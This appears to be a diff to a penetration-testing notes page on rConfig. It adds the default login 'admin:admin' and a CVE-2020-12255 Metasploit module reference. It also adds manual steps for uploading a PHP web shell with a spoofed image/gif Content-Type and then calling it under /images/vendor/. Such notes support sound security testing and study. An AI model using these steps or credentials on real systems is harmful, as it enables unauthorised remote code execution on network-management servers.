@@ -57,8 +57,29 @@ ___
 <!-- Exploitation {{{-->
 ## Exploitation
 
+<!-- Login {{{-->
+### Login
+
+Log in with default credentials
+
+<!-- Danger {{{-->
+> [!danger]
+>
+> Default Credentials
+>
+> ```sh
+> admin:admin
+> ```
+>
+<!-- }}} -->
+
+<!-- }}} -->
+
+<!-- CVE Exploits {{{-->
+### CVE Exploits
+
 <!-- CVE-2020-12255 {{{-->
-### CVE-2020-12255
+#### CVE-2020-12255
 
 [CVE-2020-12255](https://nvd.nist.gov/vuln/detail/CVE-2020-12255) —
 rConfig Vendors Auth File Upload RCE
@@ -120,6 +141,64 @@ use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
 > ```sh
 > meterpreter >
 > ```
+>
+<!-- }}} -->
+
+<!-- }}} -->
+
+<!-- }}} -->
+
+<!-- File Upload {{{-->
+### File Upload
+
+Arbitrary File Upload RCE in rConfig version <= `v3.9.6`
+
+[[Metasploit]] — [rConfig Vendors Auth File Upload RCE](https://www.rapid7.com/db/modules/exploit/linux/http/rconfig_vendors_auth_file_upload_rce/)
+
+```sh
+use rconfig_vendors_auth_file_upload_rce
+```
+
+**Manual Exploit**
+
+1. [[#Login|Log in]] with default credentials
+
+2. Navigate to `Devices` > `Vendors`
+
+3. Select `Add Vendor` and upload a
+   [[Shells/Examples/PHP#Web Shells|PHP Web Shell]]
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ![[rconfig-vendors.png]]
+>
+<!-- }}} -->
+
+4. Capture the [[HTTP/General#POST|POST]] request
+   and edit the [[HTTP Header#Content-Type|Content-Type]] header
+
+```sh
+Content-Type: image/gif
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ![[rconfig-burp.png]]
+>
+<!-- }}} -->
+
+5. Query the web shell in `/images/vendor/`
+
+```sh
+https://$target/images/vendor/shell.php
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ![[rconfig-web-shell.png]]
 >
 <!-- }}} -->
 
